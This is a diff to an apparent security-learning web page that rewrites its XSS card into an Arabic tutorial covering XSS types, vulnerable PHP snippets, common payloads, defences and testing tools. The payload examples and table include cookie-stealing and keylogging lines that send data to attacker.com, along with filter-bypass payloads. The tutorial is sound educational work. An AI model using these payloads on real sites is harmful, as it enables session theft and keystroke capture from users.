@@ -301,52 +301,130 @@
     </div>
 
     <!-- بطاقة XSS -->
-    <div class="card" onclick="toggleExplain(this)">
-      <h2>What is XSS?</h2>
+   <div class="card" onclick="toggleExplain(this)">
+      <h2>Cross-Site Scripting (XSS)</h2>
       <p>...بسم الله الرحمن الرحيم...<br>
 (وَقُل رَّبِّ زِدْنِي عِلْمًا) <br>
 نَحمدك على عطاءك مرة وعلى منعك ألف مرة فأنت الخير وما مَنعت خيرًا</p>
-      <p>I asked this to myself when I entered the world of bugs.<br>
-      And that's what I've learned until now:</p>
+      <p>XSS is one of the most common and dangerous web vulnerabilities.</p>
       <div class="date">October 2025</div>
       <div class="explain">
-        <b>Definition:</b><br>
-        It is a vulnerability that allows malicious users to inject JavaScript payloads so they can manipulate the website to execute those payloads.<br><br>
-        <b>Impact:</b>
+        <h3>1. تعريف ثغرة XSS</h3>
+        <p>
+          <strong>Cross-Site Scripting (XSS)</strong><br>
+
+           هي ثغرة أمنية تسمح للمهاجم بحقن كود<br>
+           <code>JavaScript</code> <br>
+           ضار في صفحات الويب التي يراها المستخدمون الآخرون.
+        </p>
+        <p>عندما يزور الضحية الصفحة، يتم تنفيذ السكربت في متصفحه بنفس صلاحيات الموقع الأصلي، مما يتيح:</p>
         <ul>
-          <li>Steal User's Cookies</li>
-          <li>Change the content of the page</li>
-          <li>Redirect the user to another malicious page</li>
-          <li>Execute commands without the user's permission</li>
+          <li>سرقة الكوكيز / التوكنات</li>
+          <li>تشويه الموقع (Defacement)</li>
+          <li>تسجيل ضغطات المفاتيح (Keylogging)</li>
+          <li>التصيد (Phishing)</li>
+          <li>إعادة توجيه المستخدم</li>
+          <li>تنفيذ أوامر نيابة عن المستخدم</li>
         </ul>
-        <br>
-        Can you imagine that?<br><br>
-        <b>There are three types of XSS:</b><br>
-        <b>1. Stored XSS:</b>
+        
+        <p><b>XSS<br>
+        OWASP Top 10 ولا تزال  منتشرة جدًا من ضمن</b></p>
+
+        <h3>2. أنواع ثغرة XSS</h3>
+        <table style="width:100%; border-collapse: collapse; margin: 1em 0;">
+          <tr style="background: #22272b;">
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">النوع</th>
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الوصف</th>
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الاستمرارية</th>
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">مثال</th>
+          </tr>
+          <tr>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">Reflected XSS</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">السكربت في الرابط ويُعكس في الرد</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">غير مستمر</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          </tr>
+          <tr>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">Stored XSS</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">يُخزن في قاعدة البيانات ويُعرض للجميع</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">مستمر</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">تعليق: <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code></td>
+          </tr>
+          <tr>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">DOM-Based XSS</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">في الـ JavaScript من جانب العميل</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;">غير مستمر</td>
+            <td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>innerHTML = location.hash</code></td>
+          </tr>
+        </table>
+
+        <h3>3. كيف تعمل الثغرة؟</h3>
+        <ol>
+          <li>المهاجم يجد نقطة إدخال (نموذج، رابط، تعليق...)</li>
+          <li>يحقن <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+          <li>التطبيق لا يُنظف أو يُهرب الإدخال</li>
+          <li>السكربت يُعرض ويُنفذ في متصفح الضحية</li>
+          <li>المهاجم يتحكم</li>
+        </ol>
+
+        <h3>4. أمثلة عملية</h3>
+        <h4>مثال 1: Reflected XSS</h4>
+        <pre>&lt;?php
+$query = $_GET['q'];
+echo "Search results for: " . $query;
+?&gt;</pre>
+        <p>رابط الهجوم:</p>
+        <pre>http://vulnerable.com/search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+
+        <h4>مثال 2: Stored XSS</h4>
+        <pre>&lt;?php
+$comment = $_POST['comment'];
+file_put_contents('comments.txt', $comment . "\n", FILE_APPEND);
+?&gt;</pre>
+        <p>المهاجم يرسل:</p>
+        <pre>&lt;script&gt;
+  document.location = 'http://attacker.com/steal.php?c=' + document.cookie;
+&lt;/script&gt;</pre>
+
+        <h4>مثال 3: DOM-Based XSS</h4>
+        <pre>&lt;script&gt;
+  const name = location.hash.substring(1);
+  document.getElementById('greeting').innerHTML = 'Hello, ' + name;
+&lt;/script&gt;</pre>
+        <p>رابط الهجوم:</p>
+        <pre>#&lt;img src=x onerror=alert('DOM-XSS')&gt;</pre>
+
+        <h3>5. Payloads شائعة</h3>
+        <table style="width:100%; border-collapse: collapse; margin: 1em 0;">
+          <tr style="background: #22272b;">
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الغرض</th>
+            <th style="text-align: right; padding: 0.5em; border: 1px solid #18f0c9;">الـ Payload</th>
+          </tr>
+          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">اختبار</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">سرقة الكوكيز</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>new Image().src='http://attacker.com/log?c='+document.cookie;</code></td></tr>
+          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">Keylogger</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>document.onkeypress=e=&gt;fetch('http://attacker.com/log?k='+e.key)</code></td></tr>
+          <tr><td style="padding: 0.5em; border: 1px solid #18f0c9;">تجاوز الفلاتر</td><td style="padding: 0.5em; border: 1px solid #18f0c9;"><code>&lt;img src=x onerror=alert(1)&gt;</code></td></tr>
+        </table>
+
+        <h3>6. طرق الحماية</h3>
         <ul>
-          <li>
-            The attacker injects a payload in the website itself, like comments or posts, and this payload will be stored in the database. If anybody opens the infected comment or post, the payload will execute in their web browser.
-          </li>
+          <li><strong>Output Encoding</strong>: <code>htmlspecialchars()</code> في PHP</li>
+          <li><strong>CSP</strong>: <code>&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'"&gt;</code></li>
+          <li><strong>HttpOnly Cookies</strong>: لا يمكن الوصول لها عبر JS</li>
+          <li><strong>استخدم Frameworks آمنة</strong>: Laravel, React, Django</li>
+          <li><strong>DOMPurify</strong> لتنظيف الـ HTML</li>
         </ul>
-        <b>2. Reflected XSS:</b>
+
+        <h3>7. أدوات الاختبار</h3>
         <ul>
-          <li>
-            The attacker injects the URL or a search bar, the website takes the data from the URL and presents it without filtration.
-          </li>
+          <li>Burp Suite</li>
+          <li>XSStrike</li>
+          <li>XSS Hunter</li>
+          <li>PayloadsAllTheThings</li>
         </ul>
-        <b>3. DOM-based XSS:</b>
-        <ul>
-          <li>
-            This one happens on the client-side (inside the browser) without checking the server at all. The attacker uses it when the website's JavaScript itself takes data from the URL or from any user-controlled input and writes it back to the page using unsafe functions like <code>document.write</code>. So the attacker doesn't need to deal with the server to exploit this bug, he can craft a malicious URL and send it directly to the victim.
-          </li>
-        </ul>
-        <br>
-        <i>
-        It is a very simple article indeed but it's my first one so if you think I made a mistake in explaining something, you can correct it in the comments.<br>
-        Now I'll continue grinding.
-        </i>
       </div>
     </div>
+    
 
     <!-- بطاقة IDOR -->
     <div class="card" onclick="toggleExplain(this)">
@@ -873,5 +951,3 @@ def delete_user():
   </script>
 </body>
 </html>
-
-
